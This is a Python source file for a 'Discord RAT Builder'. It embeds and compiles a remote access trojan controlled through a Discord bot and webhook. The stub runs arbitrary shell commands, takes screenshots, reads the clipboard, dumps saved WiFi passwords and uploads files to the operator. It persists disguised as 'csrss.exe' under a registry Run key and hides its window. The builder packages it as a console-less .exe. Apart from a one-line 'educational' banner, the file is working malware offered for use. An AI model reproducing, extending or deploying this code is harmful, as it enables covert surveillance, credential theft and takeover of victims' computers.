"""Discord RAT Builder — Build full-featured Discord C2 RAT .exe."""

import os
import sys
import time
import subprocess

try:
    from kevbin import clear, cprint, prompt, pause
except ImportError:
    def clear():
        os.system('cls' if os.name == 'nt' else 'clear')
    def cprint(*a, **kw):
        msg = ' '.join(str(x) for x in a if isinstance(x, str))
        sys.stdout.write(msg + '\n'); sys.stdout.flush()
    def prompt(msg=''):
        if msg: sys.stdout.write(msg); sys.stdout.flush()
        return input()
    def pause():
        prompt('\n  \033[90mPress Enter to continue...\033[0m'); input()

RAT_STUB = r'''
import os, sys, time, json, base64, subprocess, urllib.request, threading, platform, shutil, ctypes, struct, io
from datetime import datetime

WEBHOOK = "{webhook}"
TOKEN = "{token}"
CHANNEL = "{channel}"
PERSIST = {persist}
STEALTH = {stealth}
DEBUG = {debug}
SLEEP = {sleep}
PREFIX = "{prefix}"

DEBUG_LOG = []
DBG_LOCK = threading.Lock()

def dprint(msg):
    if DEBUG:
        ts = datetime.now().strftime('%H:%M:%S')
        line = f"[{{ts}}] {{msg}}"
        with DBG_LOCK:
            DEBUG_LOG.append(line)
        try:
            p = os.path.join(os.getenv("APPDATA", "."), "rat_debug.txt")
            with open(p, "a") as f:
                f.write(line + "\n")
        except: pass

def send_webhook(text):
    try:
        data = json.dumps({{"content": text}}).encode()
        req = urllib.request.Request(WEBHOOK, data=data,
                                     headers={{"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}})
        resp = urllib.request.urlopen(req, timeout=10)
        dprint(f"Webhook sent: {{resp.status}}")
        return True
    except Exception as e:
        dprint(f"Webhook error: {{e}}")
        return False

def send_file(filename, content_bytes):
    try:
        import io
        boundary = "----KevToolBoundary"
        body = b""
        body += f"--{{boundary}}\r\n".encode()
        body += f'Content-Disposition: form-data; name="file"; filename="{{filename}}"\r\n'.encode()
        body += b"Content-Type: application/octet-stream\r\n\r\n"
        body += content_bytes
        body += f"\r\n--{{boundary}}--\r\n".encode()
        req = urllib.request.Request(WEBHOOK, data=body,
                                     headers={{"Content-Type": f"multipart/form-data; boundary={{boundary}}"}})
        resp = urllib.request.urlopen(req, timeout=15)
        dprint(f"File sent: {{filename}} ({{len(content_bytes)}} bytes)")
    except Exception as e:
        dprint(f"File send error: {{e}}")

def get_info():
    info = {{"user": os.getenv("USERNAME", "?"), "computer": platform.node(),
             "os": platform.platform(), "cwd": os.getcwd(),
             "python": platform.python_version(), "pid": os.getpid()}}
    try:
        info["ip"] = urllib.request.urlopen("https://api.ipify.org", timeout=5).read().decode().strip()
    except: info["ip"] = "N/A"
    return info

def persist():
    if not PERSIST: return
    try:
        src = sys.argv[0]
        dst = os.path.join(os.getenv("APPDATA", "."), "csrss.exe")
        if src != dst and not os.path.isfile(dst):
            shutil.copy2(src, dst)
            subprocess.Popen([dst], creationflags=0x08000000)
            dprint(f"Persistence: installed to {{dst}}")
            os._exit(0)
        key = r"Software\Microsoft\Windows\CurrentVersion\Run"
        ctypes.windll.advapi32.RegSetValueExW(
            ctypes.windll.advapi32.RegOpenKeyExW(
                ctypes.windll.user32.HKEY_CURRENT_USER, key, 0, 0x20006, ctypes.byref(ctypes.c_ulong(0))
            ), "CSRSS", 0, 1, dst, len(dst)*2
        )
        dprint(f"Registry persistence set")
    except Exception as e:
        dprint(f"Persist error: {{e}}")

def take_screenshot():
    try:
        if sys.platform == 'win32':
            import ctypes.wintypes as wt
            user32 = ctypes.windll.user32
            gdi32 = ctypes.windll.gdi32
            w, h = user32.GetSystemMetrics(0), user32.GetSystemMetrics(1)
            hdc_screen = user32.GetDC(0)
            hdc_mem = gdi32.CreateCompatibleDC(hdc_screen)
            hbitmap = gdi32.CreateCompatibleBitmap(hdc_screen, w, h)
            gdi32.SelectObject(hdc_mem, hbitmap)
            gdi32.BitBlt(hdc_mem, 0, 0, w, h, hdc_screen, 0, 0, 0x00CC0020)
            bmi = struct.pack('iiiHHiiiiii', 40, w, -h, 1, 32, 0, 0, 0, 0, 0, 0)
            buf = ctypes.create_string_buffer(w * h * 4)
            gdi32.GetDIBits(hdc_mem, hbitmap, 0, h, buf, bmi, 0)
            import zlib, struct as st
            def make_bmp():
                row = w * 3
                pad = (4 - row % 4) % 4
                pixels = bytearray()
                for y in range(h):
                    offset = y * w * 4
                    for x in range(w):
                        b = buf[offset + x*4]
                        g = buf[offset + x*4 + 1]
                        r = buf[offset + x*4 + 2]
                        pixels += bytes([b, g, r])
                    pixels += b'\x00' * pad
                bmp_header = struct.pack('<2sIHHI', b'BM', 54+len(pixels), 0, 0, 54)
                dib_header = struct.pack('<IiiHHIIiiII', 40, w, h, 1, 24, 0, len(pixels), 2835, 2835, 0, 0)
                return bmp_header + dib_header + bytes(pixels)
            bmp_data = make_bmp()
            gdi32.DeleteObject(hbitmap)
            gdi32.DeleteDC(hdc_mem)
            user32.ReleaseDC(0, hdc_screen)
            return bmp_data
    except Exception as e:
        dprint(f"Screenshot error: {{e}}")
    return None

def run_command(cmd):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
        output = r.stdout + r.stderr
        dprint(f"CMD: {{cmd[:40]}} -> {{len(output)}} chars")
        return output[:1900] if output else "(no output)"
    except subprocess.TimeoutExpired:
        return "(timeout 30s)"
    except Exception as e:
        return f"Error: {{e}}"

def get_clipboard():
    try:
        r = subprocess.run(["powershell", "-NoProfile", "-Command", "Get-Clipboard"],
                           capture_output=True, text=True, timeout=5)
        return r.stdout.strip() or "(empty)"
    except: return "(error)"

def list_files(path):
    try:
        items = os.listdir(path)
        result = []
        for item in items:
            full = os.path.join(path, item)
            if os.path.isdir(full):
                result.append(f"  [DIR]  {{item}}/")
            else:
                size = os.path.getsize(full)
                result.append(f"  [FILE] {{item}} ({{size}} bytes)")
        return "\n".join(result[:50]) if result else "(empty directory)"
    except Exception as e:
        return f"Error: {{e}}"

def get_wifi():
    try:
        r = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output=True, text=True, timeout=10)
        lines = r.stdout.split('\n')
        profiles = []
        for line in lines:
            if "All User Profile" in line:
                name = line.split(":")[-1].strip()
                if name:
                    r2 = subprocess.run(["netsh", "wlan", "show", "profile", name, "key=clear"],
                                         capture_output=True, text=True, timeout=10)
                    pwd = ""
                    for l2 in r2.stdout.split('\n'):
                        if "Key Content" in l2:
                            pwd = l2.split(":")[-1].strip()
                    profiles.append(f"  {{name}}: {{pwd or '(no key)'}}")
        return "\n".join(profiles[:20]) if profiles else "(no wifi profiles)"
    except Exception as e:
        return f"Error: {{e}}"

def handle_command(cmd_text):
    parts = cmd_text.strip().split(" ", 1)
    cmd = parts[0].lower()
    args = parts[1] if len(parts) > 1 else ""
    dprint(f"Command: {{cmd}} args={{args[:30]}}")

    if cmd == "info":
        info = get_info()
        return "\n".join(f"{{k}}: {{v}}" for k, v in info.items())
    elif cmd == "shell":
        return run_command(args if args else "whoami")
    elif cmd == "cd":
        if args:
            try:
                os.chdir(args)
                return f"Changed to: {{os.getcwd()}}"
            except Exception as e:
                return str(e)
        return os.getcwd()
    elif cmd == "ls":
        return list_files(args if args else os.getcwd())
    elif cmd == "screenshot":
        data = take_screenshot()
        if data:
            send_file("screenshot.bmp", data)
            return "Screenshot sent via webhook"
        return "Screenshot failed"
    elif cmd == "clipboard":
        return get_clipboard()
    elif cmd == "wifi":
        return get_wifi()
    elif cmd == "download":
        if os.path.isfile(args):
            with open(args, 'rb') as f:
                send_file(os.path.basename(args), f.read())
            return f"Sent: {{args}}"
        return f"File not found: {{args}}"
    elif cmd == "upload":
        return "Use webhook to send files (receives via last message)"
    elif cmd == "persist":
        persist()
        return "Persistence attempt done"
    elif cmd == "kill":
        send_webhook("[RAT] Self-terminating")
        os._exit(0)
    elif cmd == "help":
        return """Commands:
  info          - System info
  shell <cmd>   - Run command
  cd <path>     - Change directory
  ls [path]     - List files
  screenshot    - Take screenshot (sent via webhook)
  clipboard     - Get clipboard content
  wifi          - Show saved WiFi passwords
  download <f>  - Send file via webhook
  persist       - Install persistence
  kill          - Terminate RAT
  help          - This help"""
    else:
        return f"Unknown command: {{cmd}} (try 'help')"

def main():
    dprint("=== RAT STARTING ===")
    dprint(f"Webhook: {{WEBHOOK[:30]}}...")
    dprint(f"Sleep: {{SLEEP}}s | Prefix: {{PREFIX}} | Persist: {{PERSIST}}")
    persist()
    if STEALTH:
        try:
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
            dprint("Console hidden")
        except: pass
    info = get_info()
    send_webhook(f"[RAT CONNECTED] {{info['user']}}@{{info['computer']}} | {{info['os']}} | IP: {{info['ip']}}")
    last_id = None
    while True:
        try:
            url = f"https://discord.com/api/v10/channels/{{CHANNEL}}/messages?limit=5"
            req = urllib.request.Request(url, headers={{"Authorization": f"Bot {{TOKEN}}", "User-Agent": "Mozilla/5.0"}})
            resp = urllib.request.urlopen(req, timeout=10)
            msgs = json.loads(resp.read().decode())
            for msg in reversed(msgs):
                if msg.get("id") == last_id: break
                content = msg.get("content", "")
                if content.startswith(PREFIX):
                    cmd = content[len(PREFIX):].strip()
                    if cmd:
                        dprint(f"Executing: {{cmd}}")
                        result = handle_command(cmd)
                        send_webhook(f"```\n{{result}}\n```")
            if msgs:
                last_id = msgs[0].get("id")
        except Exception as e:
            dprint(f"Poll error: {{e}}")
        time.sleep(SLEEP)

if __name__ == "__main__":
    main()
'''

def _debug_print(title, msg):
    cprint(f"  \033[90m[DBG] {title}: {msg}\033[0m")

def run(kevbin=None):
    debug_mode = False
    while True:
        clear()
        dbg = " \033[91m[DEBUG]\033[0m" if debug_mode else ""
        cprint("  \033[93m\u2554" + "\u2550"*50 + "\u2557")
        cprint(f"  \033[93m\u2551       DISCORD RAT BUILDER{dbg}" + " "*(27-len(dbg)) + "\u2551")
        cprint("  \033[93m\u255a" + "\u2550"*50 + "\u255d")
        cprint("  \033[91m[!] Educational/research only\033[0m")
        print()
        cprint("  \033[97m[1]  Build RAT (.py)\033[0m")
        cprint("  \033[97m[2]  Build RAT (.exe)\033[0m")
        cprint("  \033[97m[3]  View Stub Source\033[0m")
        cprint("  \033[97m[4]  Command Reference\033[0m")
        cprint("  \033[97m[5]  Toggle Debug Mode\033[0m")
        cprint("  \033[91m[0]  Back\033[0m")
        print()
        choice = prompt("\033[33m  choice > \033[0m")
        if choice == '0':
            return
        elif choice == '5':
            debug_mode = not debug_mode
            state = "\033[92mON\033[0m" if debug_mode else "\033[91mOFF\033[0m"
            cprint(f"  Debug: {state}")
            time.sleep(0.5)
            continue
        elif choice == '4':
            clear()
            cprint("  \033[93m\u2550"*54)
            cprint("  \033[93m  RAT COMMAND REFERENCE\033[0m")
            cprint("  \033[93m\u2550"*54)
            cmds = [
                ("info", "System info (user, PC, OS, IP)"),
                ("shell <cmd>", "Run shell command"),
                ("cd <path>", "Change directory"),
                ("ls [path]", "List directory contents"),
                ("screenshot", "Capture screen (sent via webhook)"),
                ("clipboard", "Get clipboard content"),
                ("wifi", "Show saved WiFi passwords"),
                ("download <file>", "Send file via webhook"),
                ("persist", "Install persistence"),
                ("kill", "Terminate RAT"),
            ]
            for name, desc in cmds:
                cprint(f"  \033[96m{prefix}{name:20}\033[0m {desc}")
        elif choice in ('1', '2'):
            clear()
            cprint("  \033[93m\u2550"*54)
            cprint("  \033[93m  RAT CONFIGURATION\033[0m")
            cprint("  \033[93m\u2550"*54)
            print()
            webhook = prompt("  \033[96mWebhook URL: \033[0m").strip()
            if not webhook or 'discord' not in webhook:
                cprint("  \033[91m[X] Need valid webhook URL\033[0m"); pause(); continue
            token = prompt("  \033[96mBot Token (for commands): \033[0m").strip()
            channel = prompt("  \033[96mChannel ID (for commands): \033[0m").strip()
            if not token or not channel:
                cprint("  \033[93m[!] No token/channel — beacon-only mode (no remote commands)\033[0m")
            if debug_mode:
                _debug_print("WEBHOOK", webhook[:40] + "...")
                _debug_print("TOKEN", token[:10] + "..." if token else "NONE")
                _debug_print("CHANNEL", channel or "NONE")
            print()
            persist_opt = prompt("  \033[96mEnable persistence? (y/n, default n): \033[0m").strip().lower() == 'y'
            stealth = prompt("  \033[96mHide console? (y/n, default y): \033[0m").strip().lower() != 'n'
            try:
                sleep_sec = int(prompt("  \033[96mBeacon interval seconds (default 5): \033[0m").strip() or '5')
            except: sleep_sec = 5
            sleep_sec = max(2, sleep_sec)
            prefix = prompt("  \033[96mCommand prefix (default !): \033[0m").strip() or "!"
            print()
            if debug_mode:
                _debug_print("CONFIG", f"Persist={persist_opt} Stealth={stealth} Sleep={sleep_sec}s Prefix={prefix}")
            stub = RAT_STUB.format(
                webhook=webhook,
                token=token or "",
                channel=channel or "",
                persist=str(persist_opt),
                stealth=str(stealth),
                debug=str(debug_mode),
                sleep=sleep_sec,
                prefix=prefix
            )
            out = prompt("  \033[96mOutput filename (default: rat.py): \033[0m").strip() or "rat.py"
            if not out.endswith('.py'): out += '.py'
            if debug_mode:
                _debug_print("STUB", f"Length: {len(stub)} bytes")
            with open(out, 'w', encoding='utf-8') as f:
                f.write(stub)
            fsize = os.path.getsize(out)
            cprint(f"  \033[92m[X] Saved: {out} ({fsize} bytes)\033[0m")
            if debug_mode:
                _debug_print("FILE", f"Path: {os.path.abspath(out)}")
            if choice == '2':
                exe_name = os.path.splitext(out)[0] + ".exe"
                if debug_mode:
                    _debug_print("BUILD", f"Target: dist/{exe_name}")
                    _debug_print("BUILD", f"Python: {sys.executable}")
                cprint("  \033[36m[*] Compiling with PyInstaller...\033[0m")
                try:
                    cmd = [sys.executable, '-m', 'PyInstaller', '--onefile',
                           '--noconsole', '--clean', '--name', os.path.splitext(exe_name)[0], out]
                    if debug_mode:
                        _debug_print("CMD", " ".join(cmd))
                    result = subprocess.run(cmd, check=True, timeout=180,
                                           capture_output=debug_mode, text=debug_mode)
                    if debug_mode and result.stdout:
                        for line in result.stdout.strip().split('\n')[-8:]:
                            _debug_print("PYINST", line.strip())
                    dist_path = os.path.join("dist", exe_name)
                    if os.path.isfile(dist_path):
                        esize = os.path.getsize(dist_path)
                        cprint(f"  \033[92m[X] Built: {dist_path} ({esize:,} bytes)\033[0m")
                        if debug_mode:
                            _debug_print("DONE", f"Full: {os.path.abspath(dist_path)}")
                    else:
                        cprint(f"  \033[93m[?] Compiled but {dist_path} not found\033[0m")
                except FileNotFoundError:
                    cprint("  \033[91m[X] pip install pyinstaller\033[0m")
                except subprocess.TimeoutExpired:
                    cprint("  \033[91m[X] Build timed out (180s)\033[0m")
                except subprocess.CalledProcessError as e:
                    cprint(f"  \033[91m[X] Build failed: exit code {e.returncode}\033[0m")
                    if debug_mode and e.stderr:
                        for line in str(e.stderr).strip().split('\n')[-6:]:
                            _debug_print("ERR", line.strip())
                except Exception as e:
                    cprint(f"  \033[91m[X] Error: {e}\033[0m")
                    if debug_mode:
                        _debug_print("EXC", str(e))
        elif choice == '3':
            clear()
            stub = RAT_STUB.format(webhook="WEBHOOK_URL", token="BOT_TOKEN",
                                    channel="CHANNEL_ID", persist="False", stealth="True",
                                    debug="False", sleep="5", prefix="!")
            print(stub)
        else:
            cprint("  \033[91mInvalid choice\033[0m")
            time.sleep(0.5)
        pause()
